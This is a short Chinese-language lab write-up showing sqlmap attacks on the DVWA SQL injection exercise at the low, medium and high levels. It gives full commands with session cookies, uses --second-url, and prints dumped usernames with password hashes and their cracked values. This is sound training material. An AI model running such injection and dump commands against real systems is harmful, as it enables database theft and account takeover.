# SQL Injection + sqlmap

> ## @Date：2021-4-28
>
> ## @Author：Tanyiqu



## low

直接跑发现不可以

```shell
sqlmap.py -u "http://193.168.4.20/vulnerabilities/sqli/?id=1&Submit=Submit#" --dbs --flush-session
```



加上cookie跑一下试试，打开浏览器调试，输入 document.cookie，可以查看cookie

```shell
sqlmap.py -u "http://193.168.4.20/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=0m1toehgd6t5h4oqnfsqcjpk05; security=low" --dbs --flush-session --batch
```



成功

```shell
[15:04:43] [INFO] fetching database names
available databases [4]:
[*] dvwa
[*] information_schema
[*] mysql
[*] performance_schema
```



爆库

```shell
# 获取dvwa库的所有表
sqlmap.py -u "http://193.168.4.20/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=0m1toehgd6t5h4oqnfsqcjpk05; security=low" -D dvwa --tables --batch --flush-session

Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+


# 获取users表的所有列
sqlmap.py -u "http://193.168.4.20/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=0m1toehgd6t5h4oqnfsqcjpk05; security=low" -D dvwa -T users --columns --batch --flush-session

Database: dvwa
Table: users
[8 columns]
+--------------+-------------+
| Column       | Type        |
+--------------+-------------+
| user         | varchar(15) |
| avatar       | varchar(70) |
| failed_login | int(3)      |
| first_name   | varchar(15) |
| last_login   | timestamp   |
| last_name    | varchar(15) |
| password     | varchar(32) |
| user_id      | int(6)      |
+--------------+-------------+


# 获取users表其中几列的数据
sqlmap.py -u "http://193.168.4.20/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=0m1toehgd6t5h4oqnfsqcjpk05; security=low" -D dvwa -T users -C "user,user_id,password" --dump --batch --flush-session

Database: dvwa
Table: users
[5 entries]
+---------+---------+---------------------------------------------+
| user    | user_id | password                                    |
+---------+---------+---------------------------------------------+
| admin   | 1       | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
| gordonb | 2       | e99a18c428cb38d5f260853678922e03 (abc123)   |
| 1337    | 3       | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
| pablo   | 4       | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
| smithy  | 5       | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+---------+---------+---------------------------------------------+
```

<br>

## medium

中级的和低级的就是get请求和post请求的区别

直接开跑，别忘了带上cookie

```shell
sqlmap.py -u "http://193.168.4.20/vulnerabilities/sqli/" --method=POST --data="id=1&Submit=Submit" --dbs --cookie="PHPSESSID=0m1toehgd6t5h4oqnfsqcjpk05; security=medium" --batch --flush-session
```



<br>

## high

使用bp抓包，发送的是post请求，但是提交页面与查询结果显示页面不是同一个

可以使用 --second-url 参数解决

```shell
sqlmap.py -u "http://193.168.4.20/vulnerabilities/sqli/session-input.php#" --method=POST --data="id=1&Submit=Submit" --second-url="http://193.168.4.20/vulnerabilities/sqli/" --cookie="PHPSESSID=0m1toehgd6t5h4oqnfsqcjpk05; security=high" --dbs --batch --flush-session
```

参考：https://blog.csdn.net/qq_42630215/article/details/106402831

<br>

更多方法待补充